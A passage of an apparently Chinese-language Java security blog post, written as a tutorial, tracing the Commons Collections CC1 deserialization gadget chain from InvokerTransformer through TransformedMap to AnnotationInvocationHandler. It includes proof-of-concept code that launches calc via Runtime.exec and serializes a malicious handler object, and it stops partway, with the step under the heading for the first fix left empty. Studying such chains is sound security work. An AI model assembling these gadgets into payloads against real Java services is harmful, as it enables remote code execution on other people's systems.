+因为TransformedMap的构造方法作用域是protected，我们还需要去找一找谁调用了TransformedMap的构造方法。<br>
+在decorate()静态方法中创建了TransformedMap对象</p>
+<p><img src="/imgss/java70.png" alt=""></p>
+<p>到这一步，尝试将其作为链子的开头，编写 POC</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer exec = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">Map decoratemap = TransformedMap.decorate(hashmap, <span class="keyword">null</span>, exec);</span><br><span class="line">Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span><br><span class="line">Method checkSetValuemethod = transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">checkSetValuemethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">checkSetValuemethod.invoke(decoratemap,runtime);</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java71.png" alt=""></p>
+<p><img src="/imgss/java72.png" alt=""></p>
+<p>解释流程：<br>
+先实例化个runtime，实例化InvokerTransformer加载执行命令，然后下一步肯定是调用.transform。<br>
+创建个hashmap，利用TransformedMap.decorate添加对象，加载exec方法<br>
+实例化TransformedMap对象，然后调用checkSetValue方法，修改权限，利用invoke加载runtime执行命令</p>
+<h4 id="3-wan-zheng-lian-zi" id="3-、完整链子">(3)、完整链子</h4>
+<p>目前找到的链子位于checkSetValue当中，去找.decorate的链子，发现无法进一步前进了，所以我们回到checkSetValue重新找链子。<br>
+继续find usages，找到了parent.checkSetValue(value);调用了checkSetValue</p>
+<p><img src="/imgss/java73.png" alt=""></p>
+<p>并且，此类是TransformedMap的父类</p>
+<p>调用checkSetValue方法的类是AbstractInputCheckedMapDecorator类中的一个内部类MapEntry<br>
+<img src="/imgss/java74.png" alt=""></p>
+<p>setValue()**实际上就是在 Map 中对一组 entry（键值对）**进行setValue()操作。</p>
+<p>所以，我们在进行.decorate方法调用，进行 Map 遍历的时候，就会走到setValue()当中，而setValue()就会调用checkSetValue</p>
+<p>跟进Abstractinputcheckedmapdecorator setValue，到继承类AbstractMapEntryDecorator setValue</p>
+<p><img src="/imgss/java75.png" alt=""></p>
+<p>再到Map 的 setValue</p>
+<p><img src="/imgss/java76.png" alt=""></p>
+<p>所以，我们在进行.decorate方法调用，进行 Map 遍历的时候，就会走到setValue()当中，而setValue()就会调用checkSetValue</p>
+<p>演示代码如下：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line">        InvokerTransformer exec = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashmap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; decoratemap = TransformedMap.decorate(hashmap, <span class="keyword">null</span>, exec);</span><br><span class="line"><span class="comment">//        Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;</span></span><br><span class="line"><span class="comment">//        Method checkSetValuemethod = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class);</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry:decoratemap.entrySet())&#123;</span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java77.png" alt=""></p>
+<p>总结：遍历一个Map最终执行setValue()方法</p>
+<h4 id="4-zhao-read-object" id="4-、找readObject">(4)、找readObject</h4>
+<blockquote>
+<p>之前链子是到setValue的，所以我们在setValue处，find usages<br>
+查询所有地方<br>
+<img src="/imgss/java78.png" alt=""></p>
+</blockquote>
+<p><img src="/imgss/java81.png" alt=""></p>
+<p>找到AnnotationInvocationHandler类，InvocationHandler这个后缀，我在基础篇-动态代理里面提到过，是用做动态代理中间处理，因为它继承了InvocationHandler接口。</p>
+<p>要调用setValue()方法，我们需要完成几个条件。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            String name = memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                Object value = memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
+<p>遍历map功能<br>
+1、成员变量memberType不为null，成员变量存在<br>
+2、memberType类型<br>
+3、最终调用memberValue.setValue</p>
+<p>看一下AnnotationInvocationHandler传参<br>
+<img src="/imgss/java82.png" alt=""></p>
+<h4 id="xie-poc" id="写poc">写poc</h4>
+<p>此时理想情况下的poc</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line">        InvokerTransformer exec = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashmap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">        hashmap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; decorateTransformedmap = TransformedMap.decorate(hashmap, <span class="keyword">null</span>, exec);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; AnnotationdeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationdeclaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o = AnnotationdeclaredConstructor.newInstance(Override.class, decorateTransformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialization(<span class="string">&quot;./2.ser&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+<p>通过反射方式实例化AnnotationInvocationHandler，设置权限，加载构造类，加载 注解类，decorateTransformedmap。<br>
+decorateTransformedmap去调用hashmap和exec执行命令。</p>
+<h4 id="wen-ti" id="问题">问题</h4>
+<p>1、Runtime对象不可序列化，需要通过反射将其变成可以序列化的形式。<br>
+可以看到下图：runtime没有继承Serializable类<br>
+<img src="/imgss/java85.png" alt=""><br>
+2、setValue()的传参，是需要传Runtime对象的；而在实际情况当中的setValue()的传参是这个东西<br>
+3、解决setValue的两个if判断</p>
+<p><img src="/imgss/java83.png" alt=""></p>
+<h4 id="jie-jue-wen-ti-1" id="解决问题1">解决问题1</h4>
+<h3 id="ke-neng-yu-dao-de-bao-cuo" id="可能遇到的报错">可能遇到的报错</h3>
+<h4 id="1-error-java-compilation-failed-internal-java-compiler-error" id="1、Error-java-Compilation-failed-internal-java-compiler-error">1、Error:java: Compilation failed: internal java compiler error</h4>
+<p>解决方案<br>
+Target bytecode version改为8<br>
+<img src="/imgss/java62.png" alt=""></p>
+<h4 id="2-lao-wen-ti-zhao-bu-dao-sun-bao" id="2、老问题：找不到sun包">2、老问题：找不到sun包</h4>
+<p>find usages，找setValue的时候，找不到<br>
+sun\reflect\annotation AnnotationInvocationHandler.java</p>
+<p>File -&gt; Project Structure --&gt; SDKs中对应jdk --&gt; Sourcepath下添加我们openjdk的zip包(或者加了sun包的原始jdk src)</p>
+<p>重新加载src文件夹，或者直接导入openjdk的zip<br>
+<img src="/imgss/java79.png" alt=""></p>
+<p><img src="/imgss/java80.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" rel="tag"># java安全系列</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/05/Java%E5%AE%89%E5%85%A8-%E7%8E%AF%E5%A2%83/" rel="prev" title="'Java安全-环境'">
+                  <i class="fa fa-chevron-left"></i> 'Java安全-环境'
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
